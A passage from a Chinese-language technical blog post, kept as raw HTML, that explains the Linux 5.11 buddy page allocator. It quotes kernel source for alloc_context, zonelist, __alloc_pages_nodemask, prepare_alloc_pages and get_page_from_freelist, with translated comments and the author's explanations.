highest_zoneidx，</span><br><span class="hljs-comment"> * 在更低的 zone 上的内存会由 lowmem_reserve[highest_zoneidx] 保护。</span><br><span class="hljs-comment"> * 译注：就是水位线机制，不记得的回去看上一篇文章</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * highest_zoneidx 同样被回收/压缩使用以限制目标 zone，</span><br><span class="hljs-comment"> * 因为高于该下标的 zone 无法用于此分配请求</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">zone_type</span> <span class="hljs-title">highest_zoneidx</span>;</span><br><span class="hljs-type">bool</span> spread_dirty_pages;<br>&#125;;<br></code></pre></td></tr></table></figure><p>我们主要关注如下成员：</p><ul><li>zonelist</li></ul><p>该成员表示在<strong>这一次的分配上下文</strong>中，我们将要操作的 zone 的<strong>列表</strong>，其为一个 <code>zonelist</code> 类型的<strong>结构体数组</strong>，该结构体定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 单次分配请求在一个 zonelist 上操作. 一个 zonelist 便是一组 zone 的列表，</span><br><span class="hljs-comment"> * 其中第一个 zone 为分配的“目标”，而其他的 zone 为后备的zone，优先级降低。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * 为了提高 zonelist 的读取速度, 在 zonerefs 中包含正在被读取的 entry 的 zone index。</span><br><span class="hljs-comment"> * 用来访问所给的 zoneref 结构体信息的帮助函数有：</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * zonelist_zone()- 返回一个 struct zone 的指针作为 _zonerefs 中的一个 entry</span><br><span class="hljs-comment"> * zonelist_zone_idx()- 返回作为 entry 的 zone 的 index</span><br><span class="hljs-comment"> * zonelist_node_idx()- 返回作为 entry 的 node 的 index</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zonelist</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zoneref</span> _<span class="hljs-title">zonerefs</span>[<span class="hljs-title">MAX_ZONES_PER_ZONELIST</span> + 1];</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>可以看到的是其为一个  <code>zoneref</code> 类型的结构体数组，该结构体定义如下，包含了一个 zone 的指针以及一个 index：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 该结构包含了 zonelist 中一个 zone 的信息。 </span><br><span class="hljs-comment"> * 其被储存在这里以预防对大结构体的解引用与对表的查询。</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zoneref</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> *<span class="hljs-title">zone</span>;</span><span class="hljs-comment">/* 指向实际上的 zone 的指针 */</span><br><span class="hljs-type">int</span> zone_idx;<span class="hljs-comment">/* zone_idx(zoneref-&gt;zone) */</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li>preferred_zoneref</li></ul><p>该成员为一个 <code>zoneref</code> 类型的结构体，表示<strong>优先用来进行分配的 zone</strong></p><ul><li>spread_dirty_pages</li></ul><p>布尔值，表示<strong>此次分配是否可能产生脏页</strong>（需要进行写回），通常分配需要写入的页会出现</p><h2 id="三、-alloc-pages-nodemask-：分配页面的「核心函数」，返回-page-结构体">三、__alloc_pages_nodemask()：分配页面的「核心函数」，返回 page 结构体</h2><p>该函数是 buddy system 中用以进行页面分配的<strong>核心函数</strong>，所有的页面分配 API 都是基于该函数的封装，其需要传入的四个参数为：</p><ul><li><code>gfp_mask</code>：分配行为参数（可以参见 <a href="https://blog.csdn.net/choumin/article/details/109603011">这里</a>）</li><li><code>order</code>：分配的连续物理页框的阶</li><li><code>preferred_nid</code> 选取的节点的 id</li><li><code>nodemask</code>：</li></ul><p>返回值为分配的<strong>连续物理页</strong>中的第一张物理页的 <code>page</code> 结构体</p><blockquote><p>如果你已经不记得 page 结构体与物理页的页框号间的转换公式了，可以回去看<a href="http://localhost:4000/2021/11/28/OS-0X02-LINUX-KERNEL-MEMORY-5.11-PART-I/#%EF%BC%881%EF%BC%89page-%E7%BB%93%E6%9E%84%E4%BD%93%E5%88%B0-PFN%EF%BC%9Apage-%E7%BB%93%E6%9E%84%E4%BD%93%E5%9C%B0%E5%9D%80%E5%87%8F%E5%8E%BB%E5%AF%B9%E5%BA%94-mem-section-gt-section-mem-map">上一篇文章</a></p><p>当然，笔者比较好心（笑），这里直接给出计算公式，<code>mem_section</code> 结构体中的 <code>section_mem_map</code> 成员存储了其起始地址减掉其起始地址对应的物理页框的页框号的差值，该成员与 page 结构体间做<strong>指针差值运算</strong>便能获得 page 结构体对应的物理页框号：<br>$$<br>address_{struct\ page} - section_mem_map = address_{struct\ page} - (address_{mem_map} - start_PFN)\<br>=(address_{struct\ page} - address_{mem_map}) + start_PFN<br>\<br>=PFN<br>$$</p></blockquote><p>这是一张_Overview_</p><p><img src="https://i.loli.net/2021/11/30/9srbaMvWeTSO1hc.png" alt="从知乎偷的.png"></p><p>该函数定义于 <code>/mm/page_alloc.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * This is the &#x27;heart&#x27; of the zoned buddy allocator.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *</span><br><span class="hljs-class">__<span class="hljs-title">alloc_pages_nodemask</span>(<span class="hljs-title">gfp_t</span> <span class="hljs-title">gfp_mask</span>, <span class="hljs-title">unsigned</span> <span class="hljs-title">int</span> <span class="hljs-title">order</span>, <span class="hljs-title">int</span> <span class="hljs-title">preferred_nid</span>,</span><br><span class="hljs-class"><span class="hljs-title">nodemask_t</span> *<span class="hljs-title">nodemask</span>)</span><br><span class="hljs-class">&#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> alloc_flags = ALLOC_WMARK_LOW;<br><span class="hljs-type">gfp_t</span> alloc_mask; <span class="hljs-comment">/* 实际用于分配的 gfp_t ，这是一个int类型的整型*/</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">alloc_context</span> <span class="hljs-title">ac</span> =</span> &#123; &#125;;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 我们假定 order 的值在一些地方是正常的，</span><br><span class="hljs-comment"> * 因此若请求超出范围则提前退出</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(order &gt;= MAX_ORDER)) &#123;<br>WARN_ON_ONCE(!(gfp_mask &amp; __GFP_NOWARN));<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>gfp_mask &amp;= gfp_allowed_mask;<br>alloc_mask = gfp_mask;<br><span class="hljs-keyword">if</span> (!prepare_alloc_pages(gfp_mask, order, preferred_nid, nodemask, &amp;ac, &amp;alloc_mask, &amp;alloc_flags))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 直到所有的 local zone 都被考虑之前，</span><br><span class="hljs-comment"> * 禁止从 falling back 到内存碎片种类的第一次传递</span><br><span class="hljs-comment"> */</span><br>alloc_flags |= alloc_flags_nofragment(ac.preferred_zoneref-&gt;zone, gfp_mask);<br><br><span class="hljs-comment">/* 第一次分配尝试 */</span><br>page = get_page_from_freelist(alloc_mask, order, alloc_flags, &amp;ac);<br><span class="hljs-keyword">if</span> (likely(page))<br><span class="hljs-keyword">goto</span> out;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 应用作用域分配约束 这主要与 GFP_NOFS 有关。</span><br><span class="hljs-comment"> * GFP_NOIO 必须从一个特定的由 memalloc_no&#123;fs,io&#125;_&#123;save,restore&#125;</span><br><span class="hljs-comment"> * 所标记的上下文中所有的分配请求中继承</span><br><span class="hljs-comment"> */</span><br>alloc_mask = current_gfp_context(gfp_mask);<br>ac.spread_dirty_pages = <span class="hljs-literal">false</span>;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 恢复最初的 nodemask （其可能被替换为 &amp;cpuset_current_mems_allowed</span><br><span class="hljs-comment"> * 以优化快速（分配）路径的尝试）</span><br><span class="hljs-comment"> */</span><br>ac.nodemask = nodemask;<br><br>page = __alloc_pages_slowpath(alloc_mask, order, &amp;ac);<br><br>out:<br><span class="hljs-keyword">if</span> (memcg_kmem_enabled() &amp;&amp; (gfp_mask &amp; __GFP_ACCOUNT) &amp;&amp; page &amp;&amp;<br>    unlikely(__memcg_kmem_charge_page(page, gfp_mask, order) != <span class="hljs-number">0</span>)) &#123;<br>__free_pages(page, order);<br>page = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br>trace_mm_page_alloc(page, order, alloc_mask, ac.migratetype);<br><br><span class="hljs-keyword">return</span> page;<br>&#125;<br>EXPORT_SYMBOL(__alloc_pages_nodemask);<br></code></pre></td></tr></table></figure><p>这个函数的具体步骤主要分为三步：</p><ul><li>检查参数合法性，并做分配前准备工作</li><li>进行<strong>快速分配</strong>，成功则直接返回结果</li><li>若快速分配失败，则进行<strong>慢速分配</strong></li></ul><p>接下来我们来深入快速分配与慢速分配的内部细节</p><h3 id="I-prepare-alloc-pages-：分配前的准备工作">I. prepare_alloc_pages()：分配前的准备工作</h3><p>这个函数比较简单，主要是做分配前的一些准备的工作，包括初始化 <code>alloc_context</code> 结构体、获取 zone 数组等：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">bool</span> <span class="hljs-title function_">prepare_alloc_pages</span><span class="hljs-params">(<span class="hljs-type">gfp_t</span> gfp_mask, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order,</span><br><span class="hljs-params"><span class="hljs-type">int</span> preferred_nid, <span class="hljs-type">nodemask_t</span> *nodemask,</span><br><span class="hljs-params"><span class="hljs-keyword">struct</span> alloc_context *ac, <span class="hljs-type">gfp_t</span> *alloc_mask,</span><br><span class="hljs-params"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *alloc_flags)</span><br>&#123;<br>ac-&gt;highest_zoneidx = gfp_zone(gfp_mask);<br>ac-&gt;zonelist = node_zonelist(preferred_nid, gfp_mask); <span class="hljs-comment">// 获取 zonelist</span><br>ac-&gt;nodemask = nodemask;<br>ac-&gt;migratetype = gfp_migratetype(gfp_mask);<br><br>    <span class="hljs-comment">// 若开启了 cpuset（限制某一组进程只运行在某些cpu和内存节点上），则设置对应的标志位。</span><br><span class="hljs-keyword">if</span> (cpusets_enabled()) &#123;<br>*alloc_mask |= __GFP_HARDWALL;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若我们在中断上下文中, 则这与当前进程上下文无关。</span><br><span class="hljs-comment"> * 这意味着任一 node 都是 ok 的.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (!in_interrupt() &amp;&amp; !ac-&gt;nodemask)<br>ac-&gt;nodemask = &amp;cpuset_current_mems_allowed;<br><span class="hljs-keyword">else</span><br>*alloc_flags |= ALLOC_CPUSET;<br>&#125;<br><br>fs_reclaim_acquire(gfp_mask);<br>fs_reclaim_release(gfp_mask);<br><br>might_sleep_if(gfp_mask &amp; __GFP_DIRECT_RECLAIM);<br><br><span class="hljs-keyword">if</span> (should_fail_alloc_page(gfp_mask, order))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>*alloc_flags = current_alloc_flags(gfp_mask, *alloc_flags);<br><br><span class="hljs-comment">/* Dirty zone 的平衡仅在 fast path 中完成 */</span><br>ac-&gt;spread_dirty_pages = (gfp_mask &amp; __GFP_WRITE);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * preferred zone 被用于进行数据统计， 但非常重要的是其页被用作</span><br><span class="hljs-comment"> * zonelist 迭代器的起始点. 对于忽略内存策略的分配，其可能会被重置。</span><br><span class="hljs-comment"> */</span><br>ac-&gt;preferred_zoneref = first_zones_zonelist(ac-&gt;zonelist,<br>ac-&gt;highest_zoneidx, ac-&gt;nodemask);<br><br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>首先调用 <code>node_zonelist()</code> 从 <code>preferred_nid</code> 参数所指定的 node 中获取一个 zonelist，其实就是取 <code>pglist_data-&gt;node_zonelists[gfp_zonelist(flags)]</code></li><li>进行 cpuset 相关判断与标志位设置，若是在中断上下文则直接将 nodemask 设为 <code>cpuset_current_mems_allowed</code></li><li>最后调用 <code>first_zones_zonelist()</code> 设置 preferred zone，大概是在 zonelist 中→nodemask 所包含的 zone 中→ <code>highest_zoneidx</code> 以下的第一个 zone</li></ul><blockquote><p>反正源码注释是这么写的hhh</p></blockquote><h3 id="II-get-page-from-freelist-：快速分配路径（核心分配函数）">II. get_page_from_freelist()：快速分配路径（核心分配函数）</h3><p>该函数定义于 <code>/mm/page_alloc.c</code> 中，主要是遍历分配上下文对应的 zonelist 中的 zone 进行内存分配，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * get_page_from_freelist 遍历 zonelist 尝试分配页面</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> page *<br><span class="hljs-title function_">get_page_from_freelist</span><span class="hljs-params">(<span class="hljs-type">gfp_t</span> gfp_mask, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> order, <span class="hljs-type">int</span> alloc_flags,</span><br><span class="hljs-params"><span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> alloc_context *ac)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zoneref</span> *<span class="hljs-title">z</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">zone</span> *<span class="hljs-title">zone</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pglist_data</span> *<span class="hljs-title">last_pgdat_dirty_limit</span> =</span> <span class="hljs-literal">NULL</span>;<br><span class="hljs-type">bool</span> no_fallback;<br><br>retry:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 扫描 zonelist, 寻找有着足够空闲页面的 zone.</span><br><span class="hljs-comment"> * 参见 __cpuset_node_allowed() 的注释（kernel/cpuset.c）</span><br><span class="hljs-comment"> */</span><br>no_fallback = alloc_flags &amp; ALLOC_NOFRAGMENT; <span class="hljs-comment">// 避免内存碎片的flag</span><br>z = ac-&gt;preferred_zoneref; <span class="hljs-comment">// 先尝试从 preferred zone 中分配</span><br>    <span class="hljs-comment">// 这是一个封装宏，表示从 z 开始遍历 zonelist 中的 zoneref 数组，</span><br>    <span class="hljs-comment">// 其核心是单次迭代调用 next_zones_zonelist()，该函数返回:</span><br>    <span class="hljs-comment">// 在 nodemask 的 zone 中，以当前 zone 作为起点游标的</span><br>    <span class="hljs-comment">// 【位于或低于】highest_zoneidx 的下一个 zone</span><br>for_next_zone_zonelist_nodemask(zone, z, ac-&gt;highest_zoneidx,<br>ac-&gt;nodemask) &#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> mark;<br><br>        <span class="hljs-comment">// 开启了 cpuset 且 flag 中有 ALLOC_CPUSET 标志位，</span><br>        <span class="hljs-comment">// 但是 cpuset 中不允许以该 gfp_mask 在该 zone 中分配，</span><br>        <span class="hljs-comment">// 进行下一次迭代</span><br><span class="hljs-keyword">if</span> (cpusets_enabled() &amp;&amp;<br>(alloc_flags &amp; ALLOC_CPUSET) &amp;&amp;<br>!__cpuset_zone_allowed(zone, gfp_mask))<br><span class="hljs-keyword">continue</span>;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 在分配页缓存（page cache）页以进行写入时, 我们想要</span><br><span class="hljs-comment"> * 在一个节点的“脏限制”（dirty limit）内获得他, </span><br><span class="hljs-comment">         * 由此，没有一个节点有着超过全局允许的脏页比例。</span><br><span class="hljs-comment"> * 脏限制考虑了节点的低端内存保留和高水位线，</span><br><span class="hljs-comment"> * 以便于 kswapd 能平衡它，而不必从其 LRU 列表中写入页面。</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">XXX:</span> 现在, 在进入回收之前，</span><br><span class="hljs-comment"> * 允许分配可能超过 慢速路径中 (spread_dirty_pages unset)</span><br><span class="hljs-comment"> * 单节点的 dirty limit，这在一个允许节点们在一起都未够大以达到全局限制</span><br><span class="hljs-comment">         * 的 NUMA 设置中是很重要的。对于这些情况的合适的修补将需要对</span><br><span class="hljs-comment"> * dirty-throttling 与 flusher threads 中节点的意识.</span><br><span class="hljs-comment"> */</span><br>        <span class="hljs-comment">// 译注：原文就是XXX，笔者也不知道这个XXX是什么...</span><br>        <span class="hljs-comment">// 大概就是检查当前zone对应node的脏页数量是不是达到限制了</span><br><span class="hljs-keyword">if</span> (ac-&gt;spread_dirty_pages) &#123;<br><span class="hljs-keyword">if</span> (last_pgdat_dirty_limit == zone-&gt;zone_pgdat)<br><span class="hljs-keyword">continue</span>;<br><br><span class="hljs-keyword">if</span> (!node_dirty_ok(zone-&gt;zone_pgdat)) &#123;<br>last_pgdat_dirty_limit = zone-&gt;zone_pgdat;<br><span class="hljs-keyword">continue</span>;<br>&#125;<br>&#125;<br><br>        <span class="hljs-comment">// node 数量大于1，且当前 zone 并非 preferred zone</span><br><span class="hljs-keyword">if</span> (no_fallback &amp;&amp; nr_online_nodes &gt; <span class="hljs-number">1</span> &amp;&amp;<br>    zone != ac-&gt;preferred_zoneref-&gt;zone) &#123;<br><span class="hljs-type">int</span> local_nid;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若移动到了 remote node（译注：非当前node？）, 则重试，</span><br><span class="hljs-comment"> * 但允许 fragmenting fallbacks. 局部性比避免碎片更加重要。</span><br><span class="hljs-comment"> */</span><br>            <span class="hljs-comment">// 比对当前 zone 是否在 local node（就是离当前CPU最近那个 node）</span><br>            <span class="hljs-comment">// 若否，则去掉 ALLOC_NOFRAGMENT 标志位，并从 preferred zone 开始重试。</span><br>            <span class="hljs-comment">// 即：kernel 更倾向于优先从 local zone 进行分配，哪怕会产生内存碎片</span><br>local_nid = zone_to_nid(ac-&gt;preferred_zoneref-&gt;zone);<br><span class="hljs-keyword">if</span> (zone_to_nid(zone) != local_nid) &#123;<br>alloc_flags &amp;= ~ALLOC_NOFRAGMENT;<br><span class="hljs-keyword">goto</span> retry;<br>&#125;<br>&#125;<br><br>        <span class="hljs-comment">// 获取当前 zone 的水位线标记</span><br>mark = wmark_pages(zone, alloc_flags &amp; ALLOC_WMARK_MASK);<br><span class="hljs-keyword">if</span> (!zone_watermark_fast(zone, order, mark,<br>       ac-&gt;highest_zoneidx, alloc_flags,<br>       gfp_mask)) &#123; <span class="hljs-comment">// 水位线相关操作</span><br><span class="hljs-type">int</span> ret;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 该 zone 的水位线失败, 但若其包含了 deferred pages，</span><br><span class="hljs-comment"> * 则我们会看该 zone 是否还能再进行扩展</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (static_branch_unlikely(&amp;deferred_pages)) &#123;<br><span class="hljs-keyword">if</span> (_deferred_grow_zone(zone, order))<br><span class="hljs-keyword">goto</span> try_this_zone;<br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">/* Checked here to keep the fast path fast */</span><br>BUILD_BUG_ON(ALLOC_NO_WATERMARKS &lt; NR_WMARK);<br>            <span class="hljs-comment">// 该标志位意为【不检查水位线】，此时我们直接尝试从该 zone 中分配</span><br><span class="hljs-keyword">if</span> (alloc_flags &amp; ALLOC_NO_WATERMARKS)<br><span class="hljs-keyword">goto</span> try_this_zone;<br><br><span class="hljs-keyword">if</span> (node_reclaim_mode == <span class="hljs-number">0</span> ||<br>    !zone_allows_reclaim(ac-&gt;preferred_zoneref-&gt;zone, zone))<br><span class="hljs-keyword">continue</span>;<br><br>            <span class="hljs-comment">// 首先进行页面回收，之后查看是否满足水位线要求，若‘</span><br>            <span class="hljs-comment">// 不扫描/没有可回收/检查未通过</span><br>            <span class="hljs-comment">// 则都会进行下一次迭代，尝试下一个 zone</span><br>ret = node_reclaim(zone-&gt;zone_pgdat, gfp_mask, order);<br><span class="hljs-keyword">switch</span> (ret) &#123;<br><span class="hljs-keyword">case</span> NODE_RECLAIM_NOSCAN:<br><span class="hljs-comment">/* 不扫描 */</span><br><span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">case</span> NODE_RECLAIM_FULL:<br><span class="hljs-comment">/* 扫描了但不可回收 */</span><br><span class="hljs-keyword">continue</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-comment">/* 检查我们是否回收了足够页面 */</span><br><span class="hljs-keyword">if</span> (zone_watermark_ok(zone, order, mark,<br>ac-&gt;highest_zoneidx, alloc_flags))<br><span class="hljs-keyword">goto</span> try_this_zone;<br><br><span class="hljs-keyword">continue</span>;<br>&#125;<br>&#125;<br><br>try_this_zone:<br>        <span class="hljs-comment">// 来到该 label 表示我们终于通过了前面一系列的各种检查，现在开始正式进行页面分配</span><br>        <span class="hljs-comment">// **************************</span><br>        <span class="hljs-comment">// rmqueue() 即为我们在OS教科书上看到的的 buddy system 模型,</span><br>        <span class="hljs-comment">// 取 freelist 对应下标 page，若无则向上遍历拆更高 order 的 page</span><br>        <span class="hljs-comment">// **************************</span><br>page = rmqueue(ac-&gt;preferred_zoneref-&gt;zone, zone, order,<br>gfp_mask, alloc_flags, ac-&gt;migratetype);<br><span class="hljs-keyword">if</span> (page) &#123;<br>prep_new_page(page, order, gfp_mask, alloc_flags);<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 若这是一个高阶的原子分配，</span><br><span class="hljs-comment"> * 检查我们是否该为将来保留 pageblock</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">if</span> (unlikely(order &amp;&amp; (alloc_flags &amp; ALLOC_HARDER)))<br>reserve_highatomic_pageblock(page, zone, order);<br><br><span class="hljs-keyword">return</span> page;<span class="hljs-comment">// 取到了，返回</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">// 没取到</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span><br><span 